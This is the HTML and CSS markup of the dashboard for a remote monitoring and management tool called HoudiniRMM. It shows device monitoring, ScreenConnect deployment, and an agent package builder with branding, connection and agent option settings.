.sidebar-nav{margin-top:8px;display:flex;flex-direction:column;gap:4px;flex:1;min-height:0;overflow-x:hidden;overflow-y:auto;padding:4px 6px 8px 4px;scrollbar-width:thin;scrollbar-color:#fb8a74 transparent}
.sidebar-nav::-webkit-scrollbar{width:4px}
.sidebar-nav::-webkit-scrollbar-track{background:transparent;margin:4px 0}
.sidebar-nav::-webkit-scrollbar-thumb{background:linear-gradient(180deg,#ff9b83,#fb8a74);border-radius:999px;min-height:28px}
.sidebar-nav::-webkit-scrollbar-thumb:hover{background:#ff9b83}
.sidebar-nav::-webkit-scrollbar-button{display:none;width:0;height:0}
.nav-btn{position:relative;isolation:isolate;display:flex;height:42px;width:100%;align-items:center;justify-content:flex-start;gap:10px;padding:0 10px;border-radius:11px;border:1px solid transparent;color:var(--text-muted);background:transparent;cursor:pointer;transition:all .25s;text-align:left;font:inherit;font-size:.8125rem;font-weight:600;letter-spacing:-.01em;white-space:nowrap}
.nav-btn:hover{border-color:rgba(255,255,255,.08);background:rgba(255,255,255,.05);color:var(--text-primary)}
.nav-btn.active{background:rgba(28,18,15,.96);color:var(--text-primary);box-shadow:var(--shadow-accent)}
.nav-btn.active::before{content:"";position:absolute;inset:0;border-radius:11px;padding:1px;background:linear-gradient(140deg,rgba(255,240,216,.95),rgba(255,195,143,.72) 32%,rgba(251,138,116,.42) 58%,rgba(251,138,116,.12) 78%,rgba(255,255,255,.04));-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
.nav-btn svg{width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;position:relative;z-index:1;flex-shrink:0}
.nav-btn .nav-label{position:relative;z-index:1;line-height:1}
a.nav-btn{text-decoration:none;color:inherit}
a.nav-btn:visited{color:inherit}

.nav-sep{width:100%;height:1px;background:var(--border);margin:6px 4px}
.nav-section{margin:14px 10px 2px;font-size:.625rem;font-weight:800;letter-spacing:.09em;text-transform:uppercase;color:var(--text-muted);opacity:.7;user-select:none}
.nav-section:first-child{margin-top:2px}
.sidebar-foot{margin-top:auto;padding:8px 8px 0;flex-shrink:0;display:flex;align-items:center;gap:10px}
.sidebar-foot .avatar{flex-shrink:0}
.sidebar-foot .foot-name{font-size:.75rem;font-weight:600;color:var(--text-secondary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
.sidebar-foot .btn{flex-shrink:0}
.avatar{height:40px;width:40px;border-radius:999px;background:rgba(255,255,255,.05);color:var(--text-secondary);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;border:1px solid var(--border)}
.main{flex:1;min-width:0;display:flex;flex-direction:column;padding:12px}
@media(min-width:640px){.main{padding:16px}}
@media(min-width:1024px){.main{padding:20px 20px 20px 8px;height:100dvh;overflow:hidden}}
.main-scroll{flex:1;min-height:0;overflow:auto;display:flex;flex-direction:column}
.mobile-bar{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:12px}
@media(min-width:1024px){.mobile-bar{display:none}}
.mobile-brand{display:flex;align-items:center;gap:10px;font-weight:700}
.mobile-brand img{width:36px;height:36px;border-radius:10px}
.page-head{display:flex;flex-wrap:wrap;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:16px}
.page-head h1{margin:0;font-size:1.8rem;font-weight:700;letter-spacing:-.025em}
.page-meta{color:var(--text-secondary);font-size:.8125rem;margin-top:4px}
.head-actions{display:flex;flex-wrap:wrap;gap:8px}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;border:1px solid var(--border-strong);background:var(--panel-strong);color:var(--text-primary);border-radius:11px;padding:9px 12px;font-size:.8125rem;font-weight:600;cursor:pointer;transition:.2s}
.btn:hover{border-color:rgba(251,138,116,.35);color:var(--accent-strong)}
.btn.primary{background:linear-gradient(140deg,rgba(255,240,216,.95),rgba(255,195,143,.75) 35%,#fb8a74);color:#1c120f;border-color:transparent;box-shadow:var(--shadow-accent);font-weight:700}
.btn.danger{background:rgba(239,99,99,.12);color:#ffb4b4;border-color:rgba(239,99,99,.25)}
.btn.ghost{background:transparent}
.btn.small{padding:5px 10px;font-size:.75rem;border-radius:9px}
.row-actions{white-space:nowrap;text-align:right}
.row-actions .btn{margin-left:6px}
.tbl-wrap{overflow-x:auto}
.mgr-tbl td{max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.btn:disabled{opacity:.45;cursor:not-allowed}
.grid-top{display:grid;gap:14px;margin-bottom:14px}
@media(min-width:1100px){.grid-top{grid-template-columns:1.15fr .85fr}}
.grid-metrics{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px;margin-bottom:14px}
@media(min-width:900px){.grid-metrics{grid-template-columns:repeat(4,minmax(0,1fr))}}
.grid-main{display:grid;gap:14px}
@media(min-width:1100px){.grid-main{grid-template-columns:minmax(0,1.4fr) minmax(280px,.8fr)}}
.panel{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius-xl);padding:20px 22px}
.panel-deep{background:var(--panel-deep);border:1px solid var(--border);border-radius:var(--radius-xl);padding:18px 20px}
.panel-soft{background:rgba(255,255,255,.025);border:1px solid var(--border-soft);border-radius:var(--radius-lg);padding:12px 16px}
.panel-title{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:14px}
.panel-title h2{margin:0;font-size:1rem;font-weight:700}
.panel-title .sub{font-size:.75rem;color:var(--text-muted);font-weight:600;letter-spacing:.04em;text-transform:uppercase}
.metric-card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius-xl);padding:16px 18px;min-height:96px;display:flex;flex-direction:column;justify-content:center;transition:.2s}
.metric-card:hover{border-color:rgba(251,138,116,.28)}
.metric-card .label{font-size:.8125rem;font-weight:600;color:var(--text-secondary);margin:0 0 8px}
.metric-card .row{display:flex;align-items:center;gap:8px}
.metric-card .value{font-size:2.2rem;font-weight:700;letter-spacing:-.03em;line-height:1}
.dot{width:8px;height:8px;border-radius:999px;display:inline-block}
.dot.accent{background:var(--accent)}.dot.green{background:var(--green)}.dot.red{background:var(--red)}
.live{display:inline-flex;align-items:center;gap:6px;font-size:.75rem;font-weight:700;color:var(--green);text-transform:uppercase;letter-spacing:.04em}
.live::before{content:"";width:6px;height:6px;border-radius:999px;background:var(--green);box-shadow:0 0 0 4px rgba(101,211,140,.15);animation:pulse 1.6s infinite}
@keyframes pulse{50%{opacity:.5}}
.device-list{display:flex;flex-direction:column;gap:10px}
.device-card{background:var(--panel-deep);border:1px solid var(--border);border-radius:var(--radius-lg);padding:14px 16px;display:flex;flex-direction:column;gap:12px;transition:.2s}
.device-card:hover{border-color:rgba(251,138,116,.22)}
.device-card.selected{border-color:rgba(251,138,116,.55);box-shadow:0 0 0 1px rgba(251,138,116,.25)}
.device-top{display:grid;grid-template-columns:auto auto auto 1fr auto;gap:8px;align-items:center}
.chk{width:15px;height:15px;accent-color:var(--accent)}
.status-dot{width:8px;height:8px;border-radius:999px}
.status-dot.on{background:var(--green);box-shadow:0 0 0 4px rgba(101,211,140,.14)}
.status-dot.off{background:var(--red)}
.dev-name{font-size:.9375rem;font-weight:700;letter-spacing:-.015em}
.dev-meta{font-size:.75rem;color:var(--text-muted);margin-top:2px}
.metrics{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:10px}
.metric .lbl{font-size:.75rem;color:var(--text-muted);font-weight:600;margin:0 0 2px}
.metric .v{font-size:.875rem;font-weight:700}
.bar{margin-top:6px;height:5px;border-radius:999px;background:rgba(255,255,255,.06);overflow:hidden}
.bar>i{display:block;height:100%;border-radius:999px;background:linear-gradient(90deg,#fb8a74,#ff9b83)}
.bar.mem>i{background:linear-gradient(90deg,#b8a5ff,#8bb7ff)}
.bar.disk>i{background:linear-gradient(90deg,#65d38c,#74d7a7)}
.bar.warn>i{background:linear-gradient(90deg,#f5c842,#ff9b83)}
.bar.hot>i{background:linear-gradient(90deg,#ef6363,#fb8a74)}
.feed{display:flex;flex-direction:column}
.feed-item{display:flex;gap:10px;padding:10px 0;border-bottom:1px solid var(--border)}
.feed-item:last-child{border-bottom:0}
.feed-avatar{width:34px;height:34px;border-radius:999px;background:rgba(255,255,255,.05);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--text-secondary);flex-shrink:0;border:1px solid var(--border)}
.feed-title{font-size:.875rem;font-weight:600}
.feed-body{font-size:.75rem;color:var(--text-muted);margin-top:2px;line-height:1.4}
.feed-time{font-size:.6875rem;color:var(--text-muted);margin-top:4px}
#toastWrap{position:fixed;top:16px;right:16px;z-index:9999;display:flex;flex-direction:column;gap:10px;max-width:360px;pointer-events:none}
.toast{pointer-events:auto;display:flex;gap:10px;align-items:flex-start;padding:12px 14px;border-radius:14px;background:rgba(24,17,14,.97);border:1px solid var(--border-strong);box-shadow:0 12px 32px rgba(0,0,0,.45);animation:toastIn .25s ease;cursor:pointer}
.toast.out{animation:toastOut .25s ease forwards}
.toast.ok{border-left:3px solid #3fbf7f}
.toast.warn{border-left:3px solid #f5c842}
.toast.err{border-left:3px solid #ef6363}
.toast-info{flex-shrink:0;width:32px;height:32px;border-radius:999px;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;background:rgba(255,255,255,.06)}
.toast.ok .toast-info{background:rgba(63,191,127,.18);color:#5fe3a0}
.toast.warn .toast-info{background:rgba(245,200,66,.18);color:#f5c842}
.toast.err .toast-info{background:rgba(239,99,99,.18);color:#ff9b83}
.toast-title{font-size:.8125rem;font-weight:700;color:var(--text-primary);line-height:1.3}
.toast-body{font-size:.75rem;color:var(--text-muted);margin-top:2px;line-height:1.4}
@keyframes toastIn{from{opacity:0;transform:translateX(24px)}to{opacity:1;transform:translateX(0)}}
@keyframes toastOut{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(24px)}}
.hidden{display:none!important}
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:760px){.form-grid{grid-template-columns:1fr}}
label.field{display:block;font-size:.75rem;color:var(--text-secondary);font-weight:600;margin:0 0 6px}
input[type=text],input[type=url],input[type=password],input[type=number],textarea{width:100%;padding:10px 12px;border-radius:10px;border:1px solid var(--border-strong);background:var(--panel-soft);color:var(--text-primary);font-size:.875rem}
input:focus,textarea:focus{outline:none;border-color:rgba(251,138,116,.45);box-shadow:0 0 0 3px rgba(251,138,116,.12)}
textarea{min-height:72px;resize:vertical}
.checks{display:flex;flex-wrap:wrap;gap:14px;margin-top:12px}
.checks label{display:flex;gap:8px;align-items:center;font-size:.875rem;color:var(--text-secondary)}
.pill{display:inline-flex;padding:4px 10px;border-radius:999px;border:1px solid var(--border);background:rgba(255,255,255,.04);color:var(--text-secondary);font-size:.75rem;font-weight:600;margin-right:6px}
.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
.info-item{background:var(--panel-soft);border:1px solid var(--border);border-radius:10px;padding:10px 12px}
.info-label{font-size:.6875rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--text-muted);margin-bottom:4px}
.info-value{font-size:.875rem;font-weight:600;color:var(--text-primary);word-break:break-all}
.preview{display:flex;gap:14px;align-items:center}
.preview img{width:64px;height:64px;border-radius:12px;object-fit:cover;border:1px solid var(--border);background:var(--panel-soft)}
.msg{min-height:1.1em;font-size:.8125rem;color:var(--green);margin:10px 0 0}
.msg.err{color:var(--red)}
.hint{font-size:.75rem;color:var(--text-muted);line-height:1.45}
.empty{padding:28px 12px;text-align:center;color:var(--text-secondary);font-size:.875rem;border:1px dashed var(--border-strong);border-radius:var(--radius-lg)}
table{width:100%;border-collapse:collapse;font-size:.8125rem}
th,td{text-align:left;padding:10px 6px;border-bottom:1px solid var(--border)}
th{color:var(--text-secondary);font-weight:600}
a.link{color:var(--accent-strong);font-weight:600}

.sidebar{overflow:hidden}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:linear-gradient(180deg,#c9a84c,#8b6914);border-radius:999px}
::-webkit-scrollbar-thumb:hover{background:#c9a84c}
*{scrollbar-width:thin;scrollbar-color:#8b6914 transparent}
.frame-view{display:flex;flex-direction:column;flex:1;min-height:calc(100dvh - 48px);height:100%;overflow:auto}
.frame-view .page-head{margin-bottom:10px}
.frame-wrap{flex:1;min-height:calc(100dvh - 160px);height:calc(100dvh - 160px);border:1px solid var(--border);border-radius:var(--radius-xl);overflow:auto;background:var(--panel-deep);position:relative}
.frame-wrap iframe{position:absolute;inset:0;width:100%;height:100%;border:0;display:block;background:#080809}
.mobile-actions{display:flex;flex-wrap:nowrap;gap:6px;overflow-x:auto;max-width:62vw;padding-bottom:4px;scrollbar-width:thin}
.device-actions{display:flex;flex-wrap:wrap;gap:6px;margin-top:2px}
.device-actions .btn{padding:6px 10px;font-size:.75rem}
.native-view{display:none}
.native-view:not(.hidden){display:flex;flex-direction:column;height:100%;overflow:auto}
.native-view .panel{margin-bottom:14px}
.tag{display:inline-block;padding:2px 8px;border-radius:999px;background:rgba(251,138,116,.12);color:var(--accent);font-size:.72rem;font-weight:700;margin:2px 4px 2px 0}
.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.8rem}
.table-wrap{overflow:auto}
.table-wrap table{width:100%;border-collapse:collapse}
.table-wrap th,.table-wrap td{text-align:left;padding:10px 8px;border-bottom:1px solid var(--border);font-size:.85rem;vertical-align:top}
.table-wrap th{color:var(--muted);font-weight:700;font-size:.75rem;text-transform:uppercase;letter-spacing:.04em}
.install-box{background:var(--panel-deep);border:1px solid var(--border);border-radius:12px;padding:14px;margin-top:10px}
.install-box pre{white-space:pre-wrap;word-break:break-all;margin:0;font-size:.78rem;line-height:1.45;color:var(--text)}
.offline-banner{display:none;margin:0 0 14px;padding:12px 14px;border-radius:12px;border:1px solid rgba(239,99,99,.35);background:rgba(239,99,99,.1);color:#ffb4b4;font-weight:600;font-size:.875rem}
.offline-banner.show{display:block}
.term-wrap{flex:1;min-height:calc(100dvh - 160px);height:calc(100dvh - 160px);border:1px solid var(--border);border-radius:var(--radius-xl);overflow:hidden;background:#0c0c0e;padding:8px;display:flex;flex-direction:column}
#termBox{flex:1;min-height:0;width:100%}
#termBox .xterm{height:100%}
#termBox .xterm-viewport{overflow-y:auto!important}
.term-status{font-size:.8rem;color:var(--muted);margin:0 0 8px;font-weight:600}
.term-status.err{color:var(--red)}
.term-status.ok{color:#65d38c}
.sec-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
@media(max-width:900px){.sec-grid{grid-template-columns:1fr}}

.modal-wrap{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;padding:16px}
.modal-wrap[hidden]{display:none}
.modal-backdrop{position:absolute;inset:0;background:rgba(6,7,10,.62);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}
.modal-card{position:relative;width:min(440px,94vw);background:var(--panel-strong);border:1px solid var(--border-strong);border-radius:var(--radius-xl);padding:22px 24px;box-shadow:0 24px 70px rgba(0,0,0,.65);animation:modalIn .18s ease}
@keyframes modalIn{from{opacity:0;transform:translateY(10px) scale(.98)}to{opacity:1;transform:none}}
.modal-title{font-size:1.05rem;font-weight:700;color:var(--text-primary);margin-bottom:10px}
.modal-body{color:var(--text-secondary);font-size:.9rem;line-height:1.55;word-break:break-word;margin-bottom:22px}
.modal-fields{display:none;margin-bottom:20px}
.modal-field{display:block;margin-bottom:12px}
.modal-field span{display:block;font-size:.75rem;color:var(--text-muted);margin-bottom:6px;font-weight:600}
.modal-input{width:100%;padding:10px 12px;border-radius:10px;border:1px solid var(--border-strong);background:var(--panel-soft);color:var(--text-primary);font-size:.875rem}
.modal-actions{display:flex;justify-content:flex-end;gap:10px}
.modal-actions .btn{min-width:96px}
</style></head><body>
<div class="app">
<aside class="sidebar">
<div class="sidebar-brand">
<img class="sidebar-logo" src="/dashboard/api/icon" alt="HoudiniRMM" onerror="this.src='/dashboard/logo.svg'"/>
<span>HoudiniRMM</span>
</div>
<nav class="sidebar-nav">
<div class="nav-section">Overview</div>
<button class="nav-btn active" type="button" data-tab="devices" id="navDevices" title="Devices"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg><span class="nav-label">Devices</span></button>
<div class="nav-section">Agent Builder</div>
<button class="nav-btn" type="button" data-tab="packages" id="navPackages" title="Packages"><svg viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><path d="M3.3 7 12 12l8.7-5M12 22V12"/></svg><span class="nav-label">Packages</span></button>
<button class="nav-btn" type="button" data-tab="scripts" id="navScripts" title="Scripts"><svg viewBox="0 0 24 24"><path d="M16 18l6-6-6-6M8 6l-6 6 6 6"/></svg><span class="nav-label">Scripts</span></button>
<button class="nav-btn" type="button" data-tab="files" id="navFiles" title="File Manager"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><span class="nav-label">File Manager</span></button>
<button class="nav-btn" type="button" data-tab="audit" id="navAudit" title="Audit"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg><span class="nav-label">Audit</span></button>
<div class="nav-section">Monitoring</div>
<div class="nav-section">Administration</div>
<button class="nav-btn" type="button" data-tab="system" data-admin="1" id="navSystem" title="System"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/></svg><span class="nav-label">System</span></button>
<button class="nav-btn" type="button" data-tab="security" id="navSecurity" title="Security"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><span class="nav-label">Security</span></button>
<button class="nav-btn" type="button" data-tab="telegram" id="navTelegram" title="Telegram alerts"><svg viewBox="0 0 24 24"><path d="M22 2 11 13"/><path d="M22 2 15 22l-4-9-9-4z"/></svg><span class="nav-label">Telegram</span></button>
<button class="nav-btn" type="button" data-tab="users" data-admin="1" id="navUsers" title="Users"><svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75"/></svg><span class="nav-label">Users</span></button>
<div class="nav-section">Account</div>
<button class="nav-btn" type="button" data-tab="settings" id="navSettings" title="Settings"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg><span class="nav-label">Settings</span></button>
<button class="nav-btn" type="button" data-tab="profile" id="navProfile" title="Profile"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg><span class="nav-label">Profile</span></button>
</nav>
<div class="sidebar-foot"><div class="avatar">HR</div><div class="foot-name">Loading…</div><button class="btn ghost" type="button" id="btnLogout" title="Sign out" style="margin-left:auto;padding:6px 10px;font-size:.75rem"><svg viewBox="0 0 24 24" width="16" height="16" style="vertical-align:middle;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg></button></div>
</aside>
<div class="main">
<div class="mobile-bar"><div class="mobile-brand"><img src="/dashboard/api/icon" alt="" onerror="this.src='/dashboard/logo.svg'"/><span>HoudiniRMM</span></div>
<div class="head-actions mobile-actions">
<button class="btn" type="button" data-tab="packages">Packages</button>
      <button class="btn" data-admin="1" type="button" data-tab="scripts">Scripts</button>
      <button class="btn" data-admin="1" type="button" data-tab="audit">Audit</button>
      <button class="btn" data-admin="1" type="button" data-tab="system">System</button>
      <button class="btn" data-admin="1" type="button" data-tab="security">Security</button>
      <button class="btn" type="button" data-tab="settings">Settings</button>
      <button class="btn" type="button" data-tab="profile">Profile</button>
      <button class="btn" type="button" data-tab="telegram">Telegram</button>
</div></div>
<div class="main-scroll">
<div id="viewDevices">
<div class="offline-banner" id="offlineBanner"></div>
<div class="page-head"><div><h1>Dashboard</h1><div class="page-meta" id="clockLine">Devices · live monitoring</div></div>
<div class="head-actions">
<button class="btn" type="button" onclick="loadDevices()">Refresh</button>
<button class="btn" type="button" onclick="toggleAll(true)">Select all</button>
<button class="btn ghost" type="button" onclick="toggleAll(false)">Clear</button>
<button class="btn danger" type="button" onclick="uninstallSelected()" id="btnBatchUninstall">Uninstall selected</button>
<button class="btn" type="button" onclick="removeSelected()" id="btnBatchRemove">Remove selected</button>
<button class="btn primary" type="button" data-tab="packages">Build package</button>
</div></div>
<div class="grid-metrics">
<div class="metric-card"><div class="label">Total Servers</div><div class="row"><span class="dot accent"></span><span class="value" id="mTotal">0</span></div></div>
<div class="metric-card"><div class="label">Online Servers</div><div class="row"><span class="dot green"></span><span class="value" id="mOnline">0</span></div></div>
<div class="metric-card"><div class="label">Offline Servers</div><div class="row"><span class="dot red"></span><span class="value" id="mOffline">0</span></div></div>
<div class="metric-card"><div class="label">Network volume</div><div class="row"><span class="value" style="font-size:1.25rem" id="mNet">↑0 · ↓0</span></div></div>
</div>
<div class="grid-top">
<div class="panel-soft"><div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start;flex-wrap:wrap"><div><div class="live">Live inventory</div><div style="margin-top:8px;font-weight:700;font-size:1.05rem" id="liveTitle">Connected agents</div><div class="hint" style="margin-top:4px" id="liveSub">Waiting for devices…</div></div><button class="btn primary" type="button" onclick="showTab('packages')">Build package</button></div></div>
<div class="panel"><div class="panel-title"><h2>Productivity</h2><span class="sub">Online rate</span></div><div style="display:flex;align-items:center;gap:18px"><div style="font-size:2.4rem;font-weight:800;letter-spacing:-.03em" id="mRate">0%</div><div class="hint">Online agents as a share of total fleet inventory.</div></div></div>
</div>
<div class="grid-main">
<section class="panel"><div class="panel-title"><div><h2>Devices</h2><div class="hint" style="margin-top:4px">Select cards for bulk remove / uninstall</div></div><span class="sub" id="devMsg">—</span></div><div class="device-list" id="devGrid"><div class="empty">Loading…</div></div></section>
<aside>
<section class="panel" style="margin-bottom:14px"><div class="panel-title"><h2>ScreenConnect</h2><span class="sub" id="scMsg">Upload MSI to deploy</span></div>
<div style="display:flex;flex-direction:column;gap:8px" id="scContent">
<span class="hint" style="text-align:center;word-break:break-all;font-weight:600" id="scFileLabel">No file uploaded</span>
<div id="scProgressWrap" style="display:none;height:6px;background:var(--panel-deep);border-radius:999px;overflow:hidden">
<div id="scProgressFill" style="height:100%;width:0;background:linear-gradient(90deg,#3fbf7f,#5fe3a0);border-radius:999px;transition:width .3s"></div>
</div>
<div style="display:flex;gap:6px" id="scBtns">
<button class="btn primary" type="button" id="btnScUpload" onclick="scUpload()" style="flex:1">Upload MSI</button>
<button class="btn" type="button" id="btnScDeploy" onclick="scDeploy()" style="flex:1">Deploy</button>
</div>
<input type="file" id="scFile" accept=".msi" style="display:none" onchange="scHandleFile(this)"/>
</div>
</section>
<section class="panel" style="margin-bottom:14px"><div class="panel-title"><h2>Notifications</h2><div><button class="btn" type="button" onclick="openNotifications()" style="font-size:.75rem;padding:4px 10px">View all</button></div></div><div class="feed" id="notifFeed"><div class="empty" style="border:0;padding:12px">No notifications yet.</div></div></section>
<section class="panel"><div class="panel-title"><h2>Recent Activity</h2><span class="sub">Agents</span></div><div class="feed" id="activityFeed"><div class="empty" style="border:0;padding:12px">No recent activity yet.</div></div></section>
</aside>
</div>
</div>
<div id="viewPackages" class="hidden native-view">
<div class="page-head"><div><h1>Packages</h1><div class="page-meta">Official agent builds for HoudiniRMM · bundled <b>v2.3.1</b></div></div><div class="head-actions"><button class="btn" type="button" onclick="showTab('devices')">Back to devices</button></div></div>
<div class="panel" style="margin-bottom:14px"><div class="preview"><img id="iconPreview" src="api/icon" alt="icon"/><div><div><span class="pill">dashboard</span><span class="pill">official binary</span></div><div class="hint" style="margin-top:8px">Windows = single installer EXE with embedded config.</div></div></div></div>
<div class="panel" style="margin-bottom:14px"><div class="panel-title"><h2>Branding</h2></div><div class="form-grid"><div><label class="field">Product / app name</label><input id="product_name" type="text"/></div><div><label class="field">Company / organization</label><input id="company" type="text"/></div></div><div style="margin-top:12px"><label class="field">Description</label><textarea id="description"></textarea></div><div class="form-grid" style="margin-top:12px"><div><label class="field">Website</label><input id="website" type="url" placeholder="https://"/></div><div><label class="field">App icon</label><label class="btn" style="cursor:pointer;margin:0">Choose file<input id="icon" type="file" accept="image/*,.ico" style="display:none" onchange="document.getElementById('iconLabel').textContent=(this.files[0]||{}).name||'No file chosen'"/></label><span class="hint" id="iconLabel">No file chosen</span></div></div></div>
<div class="panel" style="margin-bottom:14px"><div class="panel-title"><h2>Backend connection</h2><button class="btn" type="button" onclick="openBackendConnection()">Configure</button></div><input type="hidden" id="server"/><input type="hidden" id="client_secret"/><input type="hidden" id="tls"/></div>
<div class="panel" style="margin-bottom:14px"><div class="panel-title"><h2>Agent options</h2><button class="btn" type="button" onclick="openAgentOptions()">Configure</button></div>
<div><input type="hidden" id="debug"/><input type="hidden" id="disable_auto_update"/><input type="hidden" id="disable_force_update"/><input type="hidden" id="disable_command_execute"/><input type="hidden" id="disable_nat"/><input type="hidden" id="disable_send_query"/><input type="hidden" id="gpu"/><input type="hidden" id="temperature"/><input type="hidden" id="insecure_tls"/><input type="hidden" id="skip_connection_count"/><input type="hidden" id="skip_procs_count"/><input type="hidden" id="use_gitee_to_upgrade"/><input type="hidden" id="use_atomgit_to_upgrade"/><input type="hidden" id="use_ipv6_country_code"/><input type="hidden" id="ip_report_period" value="1800"/><input type="hidden" id="report_delay" value="3"/><input type="hidden" id="self_update_period" value="0"/></div>
<div class="form-grid" style="margin-top:12px">
<div><label class="field">dns (comma-separated)</label><input id="dns" type="text" placeholder="1.1.1.1,8.8.8.8"/></div>
<div><label class="field">custom_ip_api (comma URLs)</label><input id="custom_ip_api" type="text" placeholder=""/></div>
<div><label class="field">disk partition allowlist</label><input id="hard_drive_partition_allowlist" type="text" placeholder="/,/data"/></div>
<div><label class="field">nic_allowlist (JSON or names)</label><input id="nic_allowlist" type="text" placeholder='{"eth0":true}'/></div>
</div>
<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:14px;align-items:center">
<button class="btn" type="button" onclick="saveCfg()">Save settings</button>
<button class="btn" type="button" onclick="syncSecret()">Sync from dashboard</button>
</div>
</div>
<div class="panel" style="margin-bottom:14px"><div class="panel-title"><h2>Build agents</h2><span class="sub">Click a button to build that platform using saved settings</span></div>
<div style="display:flex;flex-wrap:wrap;gap:8px">
<button class="btn primary" type="button" onclick="build('windows','exe')" title="Build Windows embedded EXE installer"><svg viewBox="0 0 24 24" width="15" height="15" style="vertical-align:middle;fill:currentColor"><path d="M0 3.449 9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-13.051-1.801"/></svg> Windows EXE</button>
<button class="btn primary" type="button" onclick="build('windows','zip')" title="Build Windows ZIP package"><svg viewBox="0 0 24 24" width="15" height="15" style="vertical-align:middle;fill:currentColor"><path d="M0 3.449 9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-13.051-1.801"/></svg> Windows ZIP</button>
